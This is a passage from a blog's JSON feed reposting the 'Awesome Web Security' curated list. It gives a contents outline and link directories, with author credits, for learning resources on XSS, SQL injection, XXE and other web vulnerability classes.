data-url=\"aHR0cDovL3d3dy5jcmVzdC1hcHByb3ZlZC5vcmcvZXhhbWluYXRpb24vY2VydGlmaWVkLXNpbXVsYXRlZC1hdHRhY2stbWFuYWdlci8=\">CREST 模拟攻击管理员</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Fucy5vcmcvY291cnNlL3JlZC10ZWFtLW9wZXJhdGlvbnMtYW5kLXRocmVhdC1lbXVsYXRpb24=\">SEC564: 红队行动与威胁仿真</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "RedTeam"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/18/awesome-web-security/",
            "url": "https://self-ferry.github.io/2021/01/18/awesome-web-security/",
            "title": "Awesome Web Security【转】",
            "date_published": "2021-01-18T05:49:40.000Z",
            "content_html": "<h1 id=\"awesome-web-security-zh-awesome\"><a class=\"anchor\" href=\"#awesome-web-security-zh-awesome\">#</a> Awesome Web Security - ZH <a href=\"https://github.com/sindresorhus/awesome\"><img data-src=\"https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg\" alt=\"Awesome\" /></a></h1>\n<p><a href=\"https://www.w3.org/TR/html5/\"><img data-src=\"https://upload.wikimedia.org/wikipedia/commons/6/61/HTML5_logo_and_wordmark.svg\" align=\"right\" width=\"70\"></a></p>\n<blockquote>\n<p>🐶 Curated list of Web Security materials and resources.</p>\n</blockquote>\n<p>Needless to say, most websites suffer from various types of bugs which may eventually lead to vulnerabilities. Why would this happen so often? There can be many factors involved including misconfiguration, shortage of engineers' security skills, etc. To combat this, here is a curated list of Web Security materials and resources for learning cutting edge penetration techniques, and I highly encourage you to read this article &quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9zby15b3Utd2FudC10by1iZS1hLXdlYi1zZWN1cml0eS1yZXNlYXJjaGVy\">So you want to be a web security researcher?</span>&quot; first.</p>\n<p><em>Please read the <a href=\"CONTRIBUTING.md\">contribution guidelines</a> before contributing.</em></p>\n<hr />\n<p align=\"center\"><b>🌈 Want to strengthen your penetration skills?</b><br>I would recommend playing some <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Fwc2RlaGFsL2F3ZXNvbWUtY3Rm\">awesome-ctf</span>s.</p>\n<hr />\n<p>If you enjoy this awesome list and would like to support it, check out my <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGF0cmVvbi5jb20vYm9paw==\">Patreon</span> page 😃<br>Also, don't forget to check out my <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ng==\">repos</span> 🐾 or say <em>hi</em> on my <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9xYXpibm00NTY=\">Twitter</span>!</p>\n<h2 id=\"contents\"><a class=\"anchor\" href=\"#contents\">#</a> Contents</h2>\n<ul>\n<li><a href=\"#digests\">Digests</a></li>\n<li><a href=\"#forums\">Forums</a></li>\n<li><a href=\"#intro\">Introduction</a>\n<ul>\n<li><a href=\"#xss---cross-site-scripting\">XSS</a></li>\n<li><a href=\"#prototype-pollution\">Prototype Pollution</a></li>\n<li><a href=\"#csv-injection\">CSV Injection</a></li>\n<li><a href=\"#sql-injection\">SQL Injection</a></li>\n<li><a href=\"#command-injection\">Command Injection</a></li>\n<li><a href=\"#orm-injection\">ORM Injection</a></li>\n<li><a href=\"#ftp-injection\">FTP Injection</a></li>\n<li><a href=\"#xxe---xml-external-entity\">XXE</a></li>\n<li><a href=\"#csrf---cross-site-request-forgery\">CSRF</a></li>\n<li><a href=\"#clickjacking\">Clickjacking</a></li>\n<li><a href=\"#ssrf---server-side-request-forgery\">SSRF</a></li>\n<li><a href=\"#web-cache-poisoning\">Web Cache Poisoning</a></li>\n<li><a href=\"#relative-path-overwrite\">Relative Path Overwrite</a></li>\n<li><a href=\"#open-redirect\">Open Redirect</a></li>\n<li><a href=\"#saml\">SAML</a></li>\n<li><a href=\"#upload\">Upload</a></li>\n<li><a href=\"#rails\">Rails</a></li>\n<li><a href=\"#angularjs\">AngularJS</a></li>\n<li><a href=\"#reactjs\">ReactJS</a></li>\n<li><a href=\"#ssltls\">SSL/TLS</a></li>\n<li><a href=\"#webmail\">Webmail</a></li>\n<li><a href=\"#nfs\">NFS</a></li>\n<li><a href=\"#aws\">AWS</a></li>\n<li><a href=\"#azure\">Azure</a></li>\n<li><a href=\"#fingerprint\">Fingerprint</a></li>\n<li><a href=\"#sub-domain-enumeration\">Sub Domain Enumeration</a></li>\n<li><a href=\"#crypto\">Crypto</a></li>\n<li><a href=\"#web-shell\">Web Shell</a></li>\n<li><a href=\"#osint\">OSINT</a></li>\n<li><a href=\"#dns-rebinding\">DNS Rebinding</a></li>\n<li><a href=\"#deserialization\">Deserialization</a></li>\n<li><a href=\"#oauth\">OAuth</a></li>\n<li><a href=\"#jwt\">JWT</a></li>\n</ul>\n</li>\n<li><a href=\"#evasions\">Evasions</a>\n<ul>\n<li><a href=\"#evasions-xxe\">XXE</a></li>\n<li><a href=\"#evasions-csp\">CSP</a></li>\n<li><a href=\"#evasions-waf\">WAF</a></li>\n<li><a href=\"#evasions-jsmvc\">JSMVC</a></li>\n<li><a href=\"#evasions-authentication\">Authentication</a></li>\n</ul>\n</li>\n<li><a href=\"#tricks\">Tricks</a>\n<ul>\n<li><a href=\"#tricks-csrf\">CSRF</a></li>\n<li><a href=\"#tricks-clickjacking\">Clickjacking</a></li>\n<li><a href=\"#tricks-rce\">Remote Code Execution</a></li>\n<li><a href=\"#tricks-xss\">XSS</a></li>\n<li><a href=\"#tricks-sql-injection\">SQL Injection</a></li>\n<li><a href=\"#tricks-nosql-injection\">NoSQL Injection</a></li>\n<li><a href=\"#tricks-ftp-injection\">FTP Injection</a></li>\n<li><a href=\"#tricks-xxe\">XXE</a></li>\n<li><a href=\"#tricks-ssrf\">SSRF</a></li>\n<li><a href=\"#tricks-web-cache-poisoning\">Web Cache Poisoning</a></li>\n<li><a href=\"#tricks-header-injection\">Header Injection</a></li>\n<li><a href=\"#tricks-url\">URL</a></li>\n<li><a href=\"#tricks-deserialization\">Deserialization</a></li>\n<li><a href=\"#tricks-oauth\">OAuth</a></li>\n<li><a href=\"#tricks-others\">Others</a></li>\n</ul>\n</li>\n<li><a href=\"#browser-exploitation\">Browser Exploitation</a></li>\n<li><a href=\"#pocs\">PoCs</a>\n<ul>\n<li><a href=\"#pocs-database\">Database</a></li>\n</ul>\n</li>\n<li><a href=\"#cheetsheets\">Cheetsheets</a></li>\n<li><a href=\"#tools\">Tools</a>\n<ul>\n<li><a href=\"#tools-auditing\">Auditing</a></li>\n<li><a href=\"#tools-command-injection\">Command Injection</a></li>\n<li><a href=\"#tools-reconnaissance\">Reconnaissance</a>\n<ul>\n<li><a href=\"#tools-osint\">OSINT</a></li>\n<li><a href=\"#tools-sub-domain-enumeration\">Sub Domain Enumeration</a></li>\n</ul>\n</li>\n<li><a href=\"#tools-code-generating\">Code Generating</a></li>\n<li><a href=\"#tools-fuzzing\">Fuzzing</a></li>\n<li><a href=\"#tools-scanning\">Scanning</a></li>\n<li><a href=\"#tools-penetration-testing\">Penetration Testing</a></li>\n<li><a href=\"#tools-leaking\">Leaking</a></li>\n<li><a href=\"#tools-offensive\">Offensive</a>\n<ul>\n<li><a href=\"#tools-xss\">XSS</a></li>\n<li><a href=\"#tools-sql-injection\">SQL Injection</a></li>\n<li><a href=\"#tools-template-injection\">Template Injection</a></li>\n<li><a href=\"#tools-xxe\">XXE</a></li>\n<li><a href=\"#tools-csrf\">CSRF</a></li>\n<li><a href=\"#tools-ssrf\">SSRF</a></li>\n</ul>\n</li>\n<li><a href=\"#tools-detecting\">Detecting</a></li>\n<li><a href=\"#tools-preventing\">Preventing</a></li>\n<li><a href=\"#tools-proxy\">Proxy</a></li>\n<li><a href=\"#tools-webshell\">Webshell</a></li>\n<li><a href=\"#tools-disassembler\">Disassembler</a></li>\n<li><a href=\"#tools-decompiler\">Decompiler</a></li>\n<li><a href=\"#tools-dns-rebinding\">DNS Rebinding</a></li>\n<li><a href=\"#tools-others\">Others</a></li>\n</ul>\n</li>\n<li><a href=\"#social-engineering-database\">Social Engineering Database</a></li>\n<li><a href=\"#blogs\">Blogs</a></li>\n<li><a href=\"#twitter-users\">Twitter Users</a></li>\n<li><a href=\"#practices\">Practices</a>\n<ul>\n<li><a href=\"#practices-application\">Application</a></li>\n<li><a href=\"#practices-aws\">AWS</a></li>\n<li><a href=\"#practices-xss\">XSS</a></li>\n<li><a href=\"#practices-modsecurity\">ModSecurity / OWASP ModSecurity Core Rule Set</a></li>\n</ul>\n</li>\n<li><a href=\"#community\">Community</a></li>\n<li><a href=\"#miscellaneous\">Miscellaneous</a></li>\n</ul>\n<h2 id=\"digests\"><a class=\"anchor\" href=\"#digests\">#</a> Digests</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90cmlja2luZy5pby8=\">梧桐百科 - 碎片化知识学习</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4=\">@phith0n</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4vTWluZC1NYXA=\">phith0n/Mind-Map</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4=\">@phith0n</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja2VyMTAxLmNvbS8=\">Hacker101</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja2Vyb25lLmNvbS9zdGFydC1oYWNraW5n\">hackerone</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvZGFpbHktc3dpZw==\">The Daily Swig - Web security digest</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">PortSwigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vYmxvZy93ZWItc2VjdXJpdHkv\">Web Application Security Zone by Netsparker</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20v\">Netsparker</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94dWFud3VsYWIuZ2l0aHViLmlvL2NuL3NlY25ld3MvMjAxOC8wMS8wMS9pbmRleC5odG1s\">腾讯玄武实验室安全动态推送</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3hsYWIudGVuY2VudC5jb20vY24v\">腾讯玄武实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc25lYWt5bW9ua2V5Lm5ldC8yMDE3LzA0LzIzL2luZm9zZWMtbmV3YmllLw==\">Infosec Newbie</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc25lYWt5bW9ua2V5Lm5ldC8=\">Mark Robinson</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iaXR2aWpheXMuZ2l0aHViLmlvLw==\">The Magic of Learning</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iaXR2aWpheXMuZ2l0aHViLmlvL2Fib3V0bWUuaHRtbA==\">@bitvijays</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90cmFpbG9mYml0cy5naXRodWIuaW8vY3RmLw==\">CTF Field Guide</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJhaWxvZmJpdHMuY29tLw==\">Trail of Bits</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nb3R5b3VyLnB3Lw==\">Got Your PW</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MzMTMxMjEy\">@s3131212</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzLw==\">PayloadsAllTheThings</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90bGRyc2VjLmNvbS8=\">tl;dr sec</span> - Weekly summary of top security tools, blog posts, and security research.</li>\n</ul>\n<h2 id=\"forums\"><a class=\"anchor\" href=\"#forums\">#</a> Forums</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5waHJhY2sub3JnLw==\">Phrack Magazine</span> - Ezine written by and for hackers.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGVoYWNrZXJuZXdzLmNvbS8=\">The Hacker News</span> - Security in a serious way.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eXdlZWtseS5jb20v\">Security Weekly</span> - The security podcast network.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy50aGVyZWdpc3Rlci5jby51ay8=\">The Register</span> - Biting the hand that feeds IT.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGFya3JlYWRpbmcuY29tL0RlZmF1bHQuYXNw\">Dark Reading</span> - Connecting The Information Security Community.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2VuLmhhY2tkaWcuY29tLw==\">HackDig</span> - Dig high-quality web security articles for hacker.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tLw==\">安全客</span> - 有思想的安全新媒体 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BhcGVyLnNlZWJ1Zy5vcmcv\">Paper - 安全技术精粹</span> - Knowledge base for hacking technology built by 404 Team from <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua25vd25zZWMuY29tLw==\">knownsec</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS8=\">Freebuf</span> - Freebuf is the most popular forum in China for exchanging and sharing hacking technology.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjZnJlZS5jb20v\">指尖安全</span> - 垂直互联网安全媒体 by <a href=\"%E6%8C%87%E5%B0%96%E5%AE%89%E5%85%A8\">指尖安全</a>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tLw==\">安全脉搏</span> - Blog for Security things.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb2Nrci5vcmcv\">破壳（Beta）</span> - 能看漏洞报告的安全社区 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb2J1Zy5jb20v\">SOBUG 漏洞悬赏平台</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcm9wcy5zZWNxdWFuLm9yZy8=\">Drops (backup)</span> - Drops was known as a famous knowledge base for hacking technology.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudDAwbHMubmV0Lw==\">T00LS</span> - T00LS - 低调求发展 - 潜心习安全.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vY2hhaXRpbi10ZWNo\">长亭技术专栏</span> - 安全攻防技术分享 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2hhaXRpbi5jbi96aC8=\">长亭科技</span>.</li>\n</ul>\n<p><a name=\"intro\"></a></p>\n<h2 id=\"introduction\"><a class=\"anchor\" href=\"#introduction\">#</a> Introduction</h2>\n<p><a name=\"xss\"></a></p>\n<h3 id=\"xss-cross-site-scripting\"><a class=\"anchor\" href=\"#xss-cross-site-scripting\">#</a> XSS - Cross-Site Scripting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9pbnRsL3N3L2Fib3V0L2FwcHNlY3VyaXR5L2xlYXJuaW5nL3hzcy8=\">Cross-Site Scripting – Application Security – Google</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8=\">Google</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9INVND\">H5SC</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1Mw==\">@cure53</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9Bd2Vzb21lWFNT\">AwesomeXSS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0x1Y2FCb25naW9ybmkvWFNTLnBuZw==\">XSS.png</span> - Written by @jackmasa.- <span class=\"exturl\" data-url=\"aHR0cHM6Ly9leGNlc3MteHNzLmNvbS8=\">C.XSS Guide</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pha29iS2FsbGlu\">@JakobKallin</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2lyZW5lbG9ib3ZhbGJ1ZW5hLw==\">Irene Lobo Valbuena</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9leGNlc3MteHNzLmNvbS8=\">C.XSS Guide</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pha29iS2FsbGlu\">@JakobKallin</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2lyZW5lbG9ib3ZhbGJ1ZW5hLw==\">Irene Lobo Valbuena</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wYXVsb3N5aWJlbG8uY29tLzIwMTgvMDYvdGhlLWJpZy1iYWQtd29sZi14c3MtYW5kLW1haW50YWluaW5nLmh0bWw=\">THE BIG BAD WOLF - XSS AND MAINTAINING ACCESS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wYXVsb3N5aWJlbG8uY29tLw==\">Paulos Yibelo</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gveHNzLXBheWxvYWQtbGlzdA==\">payloadbox/xss-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1hTUyUyMEluamVjdGlvbg==\">PayloadsAllTheThings - XSS Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"prototype-pollution\"></a></p>\n<h3 id=\"prototype-pollution\"><a class=\"anchor\" href=\"#prototype-pollution\">#</a> Prototype Pollution</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVSL3Byb3RvdHlwZS1wb2xsdXRpb24tbnNlYzE4L2Jsb2IvbWFzdGVyL3BhcGVyL0phdmFTY3JpcHRfcHJvdG90eXBlX3BvbGx1dGlvbl9hdHRhY2tfaW5fTm9kZUpTLnBkZg==\">Prototype pollution attack in NodeJS application</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVS\">@HoLyVieR</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">phithon</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tL3Byb3RvdHlwZS1wb2xsdXRpb24tcmNlLWtpYmFuYS1jdmUtMjAxOS03NjA5Lw==\">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zZWN1cml0eW1i\">@securitymb</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnA2LmlzL1JlYWwtV29ybGQtSlMtMS8=\">Real-world JS - 1</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9wbzZpeA==\">@po6ix</span>.</li>\n</ul>\n<p><a name=\"csv-injection\"></a></p>\n<h3 id=\"csv-injection\"><a class=\"anchor\" href=\"#csv-injection\">#</a> CSV Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXdzLndlYmFtb296LmNvbS93cC1jb250ZW50L3VwbG9hZHMvYm90L29mZnNlY21hZy8xNDcucGRm\">CSV Injection -&gt; Meterpreter on Pornhub</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnpzZWMudWsv\">Andy</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2dlb3JnZW1hdWVyLm5ldC8yMDE3LzEwLzA3L2Nzdi1pbmplY3Rpb24uaHRtbA==\">The Absurdly Underestimated Dangers of CSV Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2dlb3JnZW1hdWVyLm5ldC8=\">George Mauer</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL0NTViUyMEluamVjdGlvbg==\">PayloadsAllTheThings - CSV Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"sql-injection\"></a></p>\n<h3 id=\"sql-injection\"><a class=\"anchor\" href=\"#sql-injection\">#</a> SQL Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vYmxvZy93ZWItc2VjdXJpdHkvc3FsLWluamVjdGlvbi1jaGVhdC1zaGVldC8=\">SQL Injection Cheat Sheet</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9uZXRzcGFya2Vy\">@netsparker</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcWx3aWtpLm5ldHNwaS5jb20v\">SQL Injection Wiki</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3BpLmNvbS8=\">NETSPI</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWJzZWMuY2Eva2Ivc3FsX2luamVjdGlvbg==\">SQL Injection Pocket Reference</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9MaWdodE9T\">@LightOS</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RvZ2V3YXRjaC5naXRodWIuaW8vMjAxNy8wMi8yNy9teXNxbC1FcnJvci1CYXNlZC1JbmplY3Rpb24v\">Error Based SQL Injection - MySQL</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2RvZ2V3YXRjaC5naXRodWIuaW8v\">DogeWatch</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvc3FsLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=\">payloadbox/sql-injection-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1NRTCUyMEluamVjdGlvbg==\">PayloadsAllTheThings - SQL Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"command-injection\"></a></p>\n<h3 id=\"command-injection\"><a class=\"anchor\" href=\"#command-injection\">#</a> Command Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3J1YnkvcnVieS9wdWxsLzE3Nzc=\">Potential command injection in resolv.rb</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyaWdnM3I=\">@drigg3r</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvY29tbWFuZC1pbmplY3Rpb24tcGF5bG9hZC1saXN0\">payloadbox/command-injection-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL0NvbW1hbmQlMjBJbmplY3Rpb24=\">PayloadsAllTheThings - Command Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"orm-injection\"></a></p>\n<h3 id=\"orm-injection\"><a class=\"anchor\" href=\"#orm-injection\">#</a> ORM Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuaDN4c3RyZWFtLmNvbS8yMDE0LzAyL2hxbC1mb3ItcGVudGVzdGVycy5odG1s\">HQL for pentesters</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oM3hzdHJlYW0v\">@h3xstream</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3luYWNrdGl2LmNvbS9yZXNzb3VyY2VzL2hxbDJzcWxfc3N0aWNfMjAxNV9lbi5wZGY=\">HQL : Hyperinsane Query Language (or how to access the whole SQL API within a HQL injection ?)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9fbTBiaXVz\">@_m0bius</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvMGFuZzNlbC9vcm0ycHduLWV4cGxvaXRpbmctaW5qZWN0aW9ucy1pbi1oaWJlcm5hdGUtb3Jt\">ORM2Pwn: Exploiting injections in Hibernate ORM</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly8wYW5nM2VsLmJsb2dzcG90LnR3Lw==\">Mikhail Egorov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvc2ltb25lLm9ub2ZyaS9vcm0taW5qZWN0aW9u\">ORM Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vbm9mcmkub3JnLw==\">Simone Onofri</span>.</li>\n</ul>\n<p><a name=\"ftp-injection\"></a></p>\n<h3 id=\"ftp-injection\"><a class=\"anchor\" href=\"#ftp-injection\">#</a> FTP Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuYmxpbmRzcG90c2VjdXJpdHkuY29tLzIwMTcvMDIvYWR2aXNvcnktamF2YXB5dGhvbi1mdHAtaW5qZWN0aW9ucy5odG1s\">Advisory: Java/Python FTP Injections Allow for Firewall Bypass</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wbHVzLmdvb2dsZS5jb20vMTA1OTE3NjE4MDk5NzY2ODMxNTg5\">Timothy Morgan</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGlmdG9yZGllLmRlL2Jsb2cvMjAxNy8wMi8xOC9zbXRwLW92ZXIteHhlLw==\">SMTP over XXE − how to send emails using Java's XML parser</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGlmdG9yZGllLmRlLw==\">Alexander Klink</span>.</li>\n</ul>\n<p><a name=\"xxe\"></a></p>\n<h3 id=\"xxe-xml-external-entity\"><a class=\"anchor\" href=\"#xxe-xml-external-entity\">#</a> XXE - XML eXternal Entity</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92aWRlby80OTk2MS5odG1s\">XML 实体攻击 - 从内网探测到命令执行步步惊心</span> - Written by 张天琪.</li>\n<li><span class=\"exturl\" 